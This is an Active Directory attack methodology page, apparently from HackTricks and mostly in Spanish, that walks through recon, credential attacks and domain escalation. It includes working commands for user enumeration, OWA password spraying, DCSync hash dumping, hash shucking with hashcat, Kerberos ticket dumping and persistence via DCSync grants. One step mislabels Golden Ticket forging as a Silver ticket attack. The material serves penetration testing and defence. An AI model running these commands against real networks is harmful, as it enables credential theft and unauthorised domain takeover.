# Metodología de Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** sirve como una tecnología fundamental, que permite a los **network administrators** crear y gestionar de forma eficiente **domains**, **users** y **objects** dentro de una red. Está diseñado para escalar, facilitando la organización de una gran cantidad de usuarios en **groups** y **subgroups** manejables, mientras controla los **access rights** en varios niveles.

La estructura de **Active Directory** se compone de tres capas principales: **domains**, **trees** y **forests**. Un **domain** abarca una colección de objects, como **users** o **devices**, que comparten una base de datos común. Los **trees** son agrupaciones de esos domains vinculados por una estructura compartida, y un **forest** representa la colección de múltiples trees, interconectados mediante **trust relationships**, formando la capa superior de la estructura organizativa. Se pueden designar derechos específicos de **access** y **communication** en cada uno de estos niveles.

Conceptos clave dentro de **Active Directory** incluyen:

1. **Directory** – Alberga toda la información relativa a los Active Directory objects.
2. **Object** – Denota entidades dentro del directory, incluyendo **users**, **groups**, o **shared folders**.
3. **Domain** – Sirve como contenedor para directory objects, con la capacidad de que múltiples domains coexistan dentro de un **forest**, cada uno manteniendo su propia colección de objects.
4. **Tree** – Una agrupación de domains que comparten un domain raíz común.
5. **Forest** – La cima de la estructura organizativa en Active Directory, compuesta por varios trees con **trust relationships** entre ellos.

**Active Directory Domain Services (AD DS)** abarca una serie de servicios críticos para la gestión centralizada y la comunicación dentro de una red. Estos servicios comprenden:

1. **Domain Services** – Centraliza el almacenamiento de datos y gestiona las interacciones entre **users** y **domains**, incluyendo **authentication** y funcionalidades de **search**.
2. **Certificate Services** – Supervisa la creación, distribución y gestión de certificados digitales seguros.
3. **Lightweight Directory Services** – Da soporte a aplicaciones habilitadas para directory mediante el **LDAP protocol**.
4. **Directory Federation Services** – Proporciona capacidades de **single-sign-on** para autenticar usuarios a través de múltiples aplicaciones web en una sola sesión.
5. **Rights Management** – Ayuda a proteger material con copyright regulando su distribución y uso no autorizados.
6. **DNS Service** – Crucial para la resolución de **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Si solo tienes acceso a un entorno AD pero no tienes credenciales/sesiones, podrías:

- **Pentest the network:**
- Escanear la red, encontrar máquinas y puertos abiertos e intentar **exploit vulnerabilities** o **extract credentials** de ellas (por ejemplo, [printers could be very interesting targets](ad-information-in-printers.md).
- La enumeración de DNS puede dar información sobre servidores clave en el domain como web, printers, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Echa un vistazo a la guía general [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) para encontrar más información sobre cómo hacer esto.
- **Check for null and Guest access on smb services** (esto no funcionará en versiones modernas de Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Una guía más detallada sobre cómo enumerar un SMB server puede encontrarse aquí:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Una guía más detallada sobre cómo enumerar LDAP puede encontrarse aquí (presta **especial atención al anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Capturar credenciales [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Acceder a hosts [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Capturar credenciales **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extraer usernames/names de documentos internos, social media, servicios (principalmente web) dentro de los entornos del domain y también de los disponibles públicamente.
- Si encuentras los nombres completos de los empleados de la compañía, podrías probar diferentes convenciones de AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Las convenciones más comunes son: _NameSurname_, _Name.Surname_, _NamSur_ (3letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Check the [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) and [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) pages.
- **Kerbrute enum**: When an **invalid username is requested** the server will respond using the **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, allowing us to determine that the username was invalid. **Valid usernames** will illicit either the **TGT in a AS-REP** response or the error _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicating that the user is required to perform pre-authentication.
- **No Authentication against MS-NRPC**: Using auth-level = 1 (No authentication) against the MS-NRPC (Netlogon) interface on domain controllers. The method calls the `DsrGetDcNameEx2` function after binding MS-NRPC interface to check if the user or computer exists without any credentials. The [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool implements this type of enumeration. The research can be found [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Si encuentras uno de estos servidores en la red, también puedes realizar **enumeración de usuarios contra él**. Por ejemplo, podrías usar la herramienta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Sin embargo, deberías tener el **nombre de las personas que trabajan en la empresa** gracias al paso de recon que deberías haber realizado antes. Con el nombre y el apellido podrías usar el script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para generar posibles usernames válidos.

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): Si un usuario **no tiene** el atributo _DONT_REQ_PREAUTH_ puedes **solicitar un mensaje AS_REP** para ese usuario que contendrá datos cifrados por una derivación de la contraseña del usuario.
- [**Password Spraying**](password-spraying.md): Probemos las **contraseñas más comunes** con cada uno de los usuarios descubiertos; quizá algún usuario esté usando una contraseña débil (¡ten en cuenta la política de contraseñas!).
- Ten en cuenta que también puedes **spray OWA servers** para intentar acceder a los servidores de correo de los usuarios.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Podrías ser capaz de **obtener** algunos challenge **hashes** para crackear mediante **poisoning** algunos protocolos de la **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Si has logrado enumerar el Active Directory tendrás **más emails y una mejor comprensión de la network**. Podrías ser capaz de forzar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) para obtener acceso al entorno AD.

### NetExec workspace-driven recon & relay posture checks

- Usa **`nxcdb` workspaces** para mantener el estado de recon de AD por engagement: `workspace create <name>` crea SQLite DBs por-protocolo bajo `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Cambia vistas con `proto smb|mssql|winrm` y lista secretos recopilados con `creds`. Purga manualmente datos sensibles cuando termines: `rm -rf ~/.nxc/workspaces/<name>`.
- Descubrimiento rápido de subredes con **`netexec smb <cidr>`** muestra **domain**, **OS build**, **SMB signing requirements**, y **Null Auth**. Miembros que muestran `(signing:False)` son **relay-prone**, mientras que los DCs suelen requerir signing.
- Genera **hostnames in /etc/hosts** directamente desde la salida de NetExec para facilitar el targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Cuando **SMB relay to the DC is blocked** por signing, aún comprueba la postura de **LDAP**: `netexec ldap <dc>` resalta `(signing:None)` / weak channel binding. Un DC con SMB signing required pero LDAP signing disabled sigue siendo un objetivo viable de **relay-to-LDAP** para abusos como **SPN-less RBCD**.

### Credenciales de impresora del lado del cliente leaks → validación masiva de credenciales de dominio

- Las UIs de impresora/web a veces **incrustan contraseñas de administrador enmascaradas en HTML**. Ver el source/devtools puede revelar texto en claro (p. ej., `<input value="<password>">`), permitiendo acceso Basic-auth a repositorios de trabajos de escaneo/impresión.
- Los trabajos de impresión recuperados pueden contener **documentos de onboarding en texto plano** con contraseñas por usuario. Mantén los emparejamientos alineados cuando pruebes:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Robar credenciales NTLM

Si puedes **acceder a otros PCs o shares** con el **usuario null o guest** podrías **colocar archivos** (como un archivo SCF) que si se acceden de alguna forma **dispararán una autenticación NTLM contra ti** para que puedas **robar** el **challenge NTLM** y crackearlo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** trata cada hash NT que ya posees como una contraseña candidata para otros formatos más lentos cuyo material de clave se deriva directamente del hash NT. En lugar de bruteforcear frases de paso largas en tickets Kerberos RC4, desafíos NetNTLM o credenciales en caché, alimentas los hashes NT en los modos NT-candidate de Hashcat y dejas que valide la reutilización de contraseñas sin llegar a conocer el texto plano. Esto es especialmente potente tras una compromisión de dominio donde puedes recolectar miles de hashes NT actuales e históricos.

Usa shucking cuando:

- Tienes un corpus NT de DCSync, volcado de SAM/SECURITY, o vaults de credenciales y necesitas probar la reutilización en otros dominios/forests.
- Capturas material Kerberos basado en RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respuestas NetNTLM, o blobs DCC/DCC2.
- Quieres demostrar rápidamente la reutilización para passphrases largas e irrompibles y pivotar inmediatamente vía Pass-the-Hash.

La técnica **no funciona** contra tipos de cifrado cuyas claves no son el hash NT (p. ej., Kerberos etype 17/18 AES). Si un dominio aplica sólo AES, debes volver a los modos de contraseña regulares.

#### Construyendo un corpus de hashes NT

- **DCSync/NTDS** – Usa `secretsdump.py` con history para obtener el conjunto más grande posible de hashes NT (y sus valores anteriores):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Las entradas de history amplían dramáticamente el grupo de candidatos porque Microsoft puede almacenar hasta 24 hashes anteriores por cuenta. Para más formas de harvestear secretos de NTDS ver:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (o Mimikatz `lsadump::sam /patch`) extrae datos locales de SAM/SECURITY y logons de dominio en caché (DCC/DCC2). Desduplicar y añadir esos hashes a la misma lista `nt_candidates.txt`.
- **Rastrear metadata** – Conserva el username/domain que produjo cada hash (incluso si la wordlist contiene solo hex). Los hashes que coinciden te dicen inmediatamente qué principal está reutilizando una contraseña una vez que Hashcat imprime el candidato ganador.
- Prefiere candidatos del mismo forest o de un forest confiable; eso maximiza la probabilidad de solapamiento al shuckear.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notas:

- Las entradas NT-candidate **deben permanecer como hashes NT crudos de 32-hex**. Desactiva los motores de reglas (no `-r`, no modos híbridos) porque el mangling corrompe el material clave candidato.
- Estos modos no son inherentemente más rápidos, pero el keyspace NTLM (~30,000 MH/s en un M3 Max) es ~100× más rápido que Kerberos RC4 (~300 MH/s). Probar una lista NT curada es mucho más barato que explorar todo el espacio de contraseñas en el formato lento.
- Ejecuta siempre la **última build de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) porque los modos 31500/31600/35300/35400 se publicaron recientemente.
- Actualmente no existe un modo NT para AS-REQ Pre-Auth, y los etypes AES (19600/19700) requieren la contraseña en texto plano porque sus claves se derivan vía PBKDF2 desde contraseñas UTF-16LE, no desde hashes NT crudos.

#### Ejemplo – Kerberoast RC4 (modo 35300)

1. Captura un TGS RC4 para un SPN objetivo con un usuario de baja priv (ver la página Kerberoast para detalles):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuckea el ticket con tu lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva la clave RC4 de cada candidato NT y valida el blob `$krb5tgs$23$...`. Una coincidencia confirma que la cuenta de servicio usa uno de tus hashes NT existentes.

3. Pivotar inmediatamente vía PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcionalmente puedes recuperar el texto plano más tarde con `hashcat -m 1000 <matched_hash> wordlists/` si es necesario.

#### Ejemplo – Cached credentials (modo 31600)

1. Vuelca los logons en caché desde una workstation comprometida:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copia la línea DCC2 del usuario de dominio interesante en `dcc2_highpriv.txt` y shuckéala:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Una coincidencia exitosa produce el hash NT ya conocido en tu lista, demostrando que el usuario en caché está reutilizando una contraseña. Úsalo directamente para PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) o bruteforcealo en modo NTLM rápido para recuperar la cadena.

El mismo flujo de trabajo aplica a las respuestas de desafío NetNTLM (`-m 27000/27100`) y DCC (`-m 31500`). Una vez identificada una coincidencia puedes lanzar relay, PtH SMB/WMI/WinRM, o volver a crackear el hash NT con masks/rules offline.



## Enumerando Active Directory CON credenciales/sesión

Para esta fase necesitas haber **comprometido las credenciales o una sesión de una cuenta de dominio válida.** Si tienes algunas credenciales válidas o una shell como usuario de dominio, **debes recordar que las opciones dadas anteriormente siguen siendo opciones para comprometer a otros usuarios**.

Antes de empezar la enumeración autenticada deberías conocer cuál es el **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeración

Haber comprometido una cuenta es un **gran paso para empezar a comprometer todo el dominio**, porque vas a poder iniciar la **enumeración de Active Directory:**

Con respecto a [**ASREPRoast**](asreproast.md) ahora puedes encontrar todos los usuarios posibles vulnerables, y con respecto a [**Password Spraying**](password-spraying.md) puedes obtener una **lista de todos los nombres de usuario** y probar la contraseña de la cuenta comprometida, contraseñas vacías y nuevas contraseñas prometedoras.

- Podrías usar el [**CMD para realizar un reconocimiento básico**](../basic-cmd-for-pentesters.md#domain-info)
- También puedes usar [**powershell para reconocimiento**](../basic-powershell-for-pentesters/index.html) que será más sigiloso
- También puedes [**usar powerview**](../basic-powershell-for-pentesters/powerview.md) para extraer información más detallada
- Otra herramienta fantástica para reconocimiento en Active Directory es [**BloodHound**](bloodhound.md). **No es muy sigiloso** (dependiendo de los métodos de colección que uses), pero **si no te importa** eso, deberías probarlo. Encuentra dónde los usuarios pueden RDP, rutas hacia otros grupos, etc.
- **Otras herramientas automatizadas de enumeración AD son:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Registros DNS del AD**](ad-dns-records.md) ya que pueden contener información interesante.
- Una **herramienta con GUI** que puedes usar para enumerar el directorio es **AdExplorer.exe** de la Suite **SysInternal**.
- También puedes buscar en la base LDAP con **ldapsearch** para buscar credenciales en los campos _userPassword_ & _unixUserPassword_, o incluso en _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para otros métodos.
- Si usas **Linux**, también podrías enumerar el dominio usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- También podrías probar herramientas automatizadas como:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extrayendo todos los usuarios del dominio**

Es muy fácil obtener todos los nombres de usuario del dominio desde Windows (`net user /domain`, `Get-DomainUser` o `wmic useraccount get name,sid`). En Linux, puedes usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` o `enum4linux -a -u "user" -p "password" <DC IP>`

> Incluso si esta sección de Enumeración parece corta, esta es la parte más importante de todas. Accede a los enlaces (principalmente los de cmd, powershell, powerview y BloodHound), aprende cómo enumerar un dominio y practica hasta que te sientas cómodo. Durante una evaluación, este será el momento clave para encontrar tu camino hacia DA o para decidir que no se puede hacer nada.

### Kerberoast

Kerberoasting implica obtener **tickets TGS** usados por servicios vinculados a cuentas de usuario y crackear su cifrado —que se basa en las contraseñas de usuario— **offline**.

Más sobre esto en:


{{#ref}}
kerberoast.md
{{#endref}}

### Conexión remota (RDP, SSH, FTP, Win-RM, etc)

Una vez que has obtenido algunas credenciales podrías comprobar si tienes acceso a alguna **máquina**. Para eso, podrías usar **CrackMapExec** para intentar conectarte a varios servidores con diferentes protocolos, acorde a tus escaneos de puertos.

### Escalada de privilegios local

Si has comprometido credenciales o una sesión como usuario de dominio regular y tienes **acceso** con este usuario a **cualquier máquina del dominio** deberías intentar encontrar la forma de **escalar privilegios localmente y saquear credenciales**. Esto es porque sólo con privilegios de administrador local podrás **volcar hashes de otros usuarios** en memoria (LSASS) y localmente (SAM).

Hay una página completa en este libro sobre [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) y una [**checklist**](../checklist-windows-privilege-escalation.md). Además, no olvides usar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets de sesión actuales

Es muy **improbable** que encuentres **tickets** en el usuario actual que te den permiso para acceder a recursos inesperados, pero podrías comprobar:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Si has logrado enumerar el Active Directory tendrás **más correos electrónicos y una mejor comprensión de la red**. Podrías ser capaz de forzar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Busca Creds en Computer Shares | SMB Shares

Ahora que tienes algunas credenciales básicas deberías comprobar si puedes **encontrar** algún **archivo interesante compartido dentro del AD**. Podrías hacerlo manualmente pero es una tarea muy aburrida y repetitiva (y más aún si encuentras cientos de documentos que necesitas revisar).

[**Sigue este enlace para aprender sobre herramientas que podrías usar.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Robar NTLM Creds

Si puedes **acceder a otros PCs o shares** podrías **colocar archivos** (como un SCF file) que si de alguna forma se acceden **dispararán una autenticación NTLM contra ti** para que puedas **robar** el **NTLM challenge** y crackearlo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Esta vulnerabilidad permitía a cualquier usuario autenticado **comprometer el domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Escalada de privilegios en Active Directory CON credenciales/sesión privilegiadas

**Para las siguientes técnicas un usuario de dominio normal no es suficiente, necesitas algunos privilegios/credenciales especiales para realizar estos ataques.**

### Hash extraction

Con suerte has logrado **comprometer alguna cuenta de local admin** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluyendo relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Entonces, es hora de volcar todos los hashes en memoria y localmente.\
[**Lee esta página sobre las diferentes formas de obtener los hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una vez que tienes el hash de un usuario**, puedes usarlo para **hacerte pasar por él**.\
Necesitas usar alguna **herramienta** que **realice** la **autenticación NTLM usando** ese **hash**, **o** podrías crear un nuevo **sessionlogon** e **inyectar** ese **hash** dentro del **LSASS**, así cuando se realice cualquier **autenticación NTLM**, ese **hash será usado.** La última opción es lo que hace mimikatz.\
[**Lee esta página para más información.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque tiene como objetivo **usar el hash NTLM del usuario para solicitar tickets Kerberos**, como alternativa al común Pass The Hash sobre el protocolo NTLM. Por lo tanto, esto puede ser especialmente **útil en redes donde el protocolo NTLM está deshabilitado** y solo **Kerberos está permitido** como protocolo de autenticación.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

En el método de ataque **Pass The Ticket (PTT)**, los atacantes **roban el ticket de autenticación de un usuario** en lugar de su contraseña o valores hash. Este ticket robado se usa para **hacerte pasar por el usuario**, obteniendo acceso no autorizado a recursos y servicios dentro de una red.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Si tienes el **hash** o la **contraseña** de un **local administrator** deberías intentar **iniciar sesión localmente** en otros **PCs** con ella.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Tenga en cuenta que esto es bastante **noisy** y **LAPS** lo **mitigaría**.

### MSSQL Abuse & Trusted Links

Si un usuario tiene privilegios para **acceder a instancias MSSQL**, podría usarlas para **ejecutar comandos** en el host MSSQL (si se ejecuta como SA), **robar** el **hash** NetNTLM o incluso realizar un **relay** **attack**.\
Además, si una instancia MSSQL es trusted (database link) por otra instancia MSSQL. Si el usuario tiene privilegios sobre la base de datos confiada, podrá **usar la relación de confianza para ejecutar consultas también en la otra instancia**. Estas trusts pueden encadenarse y en algún punto el usuario podría encontrar una base de datos mal configurada donde pueda ejecutar comandos.\
**Los links entre bases de datos funcionan incluso a través de forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Las suites de inventario y despliegue de terceros a menudo exponen caminos potentes hacia credenciales y ejecución de código. Ver:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si encuentra cualquier Computer object con el atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) y tiene privilegios de dominio en el equipo, podrá volcar TGTs desde la memoria de todos los usuarios que inicien sesión en el equipo.\
Así que, si un **Domain Admin inicia sesión en el equipo**, podrá volcar su TGT e impersonarlo usando [Pass the Ticket](pass-the-ticket.md).\
Gracias a constrained delegation incluso podría **comprometer automáticamente un Print Server** (con suerte será un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si a un usuario o equipo se le permite "Constrained Delegation" podrá **impersonar a cualquier usuario para acceder a algunos servicios en un equipo**.\
Entonces, si **comprometes el hash** de este usuario/equipo podrás **impersonar a cualquier usuario** (incluso domain admins) para acceder a ciertos servicios.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Tener privilegio **WRITE** sobre un objeto de Active Directory de un equipo remoto permite la obtención de ejecución de código con **privilegios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

El usuario comprometido podría tener algunos **privilegios interesantes sobre ciertos objetos del dominio** que podrían permitirte **moverte** lateralmente/**escalar** privilegios más adelante.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Descubrir un **Spool service escuchando** dentro del dominio puede ser **abusado** para **adquirir nuevas credenciales** y **escalar privilegios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Si **otros usuarios** **acceden** a la máquina **comprometida**, es posible **recopilar credenciales desde memoria** e incluso **inyectar beacons en sus procesos** para impersonarlos.\
Normalmente los usuarios accederán al sistema vía RDP, así que aquí tienes cómo realizar un par de ataques sobre sesiones RDP de terceros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** proporciona un sistema para gestionar la **contraseña del Administrator local** en equipos unidos al dominio, asegurando que esté **aleatorizada**, sea única y se **cambie** frecuentemente. Estas contraseñas se almacenan en Active Directory y el acceso está controlado mediante ACLs sólo para usuarios autorizados. Con permisos suficientes para acceder a estas contraseñas, es posible pivotar a otros equipos.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Recopilar certificados** de la máquina comprometida podría ser una forma de escalar privilegios dentro del entorno:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Si se configuran **templates vulnerables** es posible abusar de ellas para escalar privilegios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Una vez que obtienes privilegios de **Domain Admin** o, aún mejor, **Enterprise Admin**, puedes **volcar** la **base de datos del dominio**: _ntds.dit_.

[**Más información sobre el DCSync attack puede encontrarse aquí**](dcsync.md).

[**Más información sobre cómo robar el NTDS.dit puede encontrarse aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Algunas de las técnicas discutidas antes pueden usarse para persistencia.\
Por ejemplo, podrías:

- Hacer a usuarios vulnerables a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Hacer a usuarios vulnerables a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Conceder privilegios [**DCSync**](#dcsync) a un usuario

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

El **Silver Ticket attack** crea un **TGS ticket legítimo** para un servicio específico usando el **NTLM hash** (por ejemplo, el **hash de la cuenta PC**). Este método se emplea para **acceder a los privilegios del servicio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un **Golden Ticket attack** implica que un atacante obtenga acceso al **NTLM hash de la cuenta krbtgt** en un entorno Active Directory (AD). Esta cuenta es especial porque se usa para firmar todos los **Ticket Granting Tickets (TGTs)**, que son esenciales para autenticarse dentro de la red AD.

Una vez que el atacante obtiene este hash, puede crear **TGTs** para cualquier cuenta que elija (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

